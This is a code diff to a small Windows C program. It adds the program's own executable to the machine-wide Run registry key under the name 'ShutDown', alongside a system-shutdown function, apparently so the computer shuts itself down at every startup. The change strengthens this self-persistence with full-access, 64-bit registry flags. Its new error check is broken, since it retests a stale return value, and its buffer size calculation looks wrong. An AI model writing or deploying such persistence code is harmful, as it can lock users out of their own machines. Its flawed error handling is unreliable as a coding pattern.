@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <stdio.h>
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "advapi32.lib")
 
@@ -31,11 +32,22 @@ BOOL MySystemShutdown(){
     return TRUE;
 }
 void edit_reg(){
-    HKEY hKey = {0};
-    RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
-    char sz_path_c[MAXBYTE] = {0};
-    GetModuleFileNameA(nullptr, sz_path_c, MAXBYTE);    // get current exe file path
-    RegSetValueExA(hKey, "ShutDown", 0, REG_SZ, (BYTE*)sz_path_c, strlen(sz_path_c));
+    HKEY hKey;
+    REGSAM flag = KEY_WOW64_64KEY; 
+    LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS | flag, &hKey);
+    if ( ERROR_SUCCESS != lRet){
+        printf("RegKey open failed.");
+        return;
+    } 
+
+    TCHAR sz_path_c[MAXBYTE] = {0};
+    GetModuleFileName(nullptr, sz_path_c, MAXBYTE);    // get current exe file path
+    RegSetValueEx(hKey, TEXT("ShutDown"), 0, REG_SZ, (LPBYTE)sz_path_c, wcslen(sz_path_c)*sizeof(TCHAR)+1);
+    if ( ERROR_SUCCESS != lRet){ 
+        printf("RegKey write failed.");
+        return;  
+    }
+    RegCloseKey(hKey);
 }
 
 int main(int argc, char* argv[]){
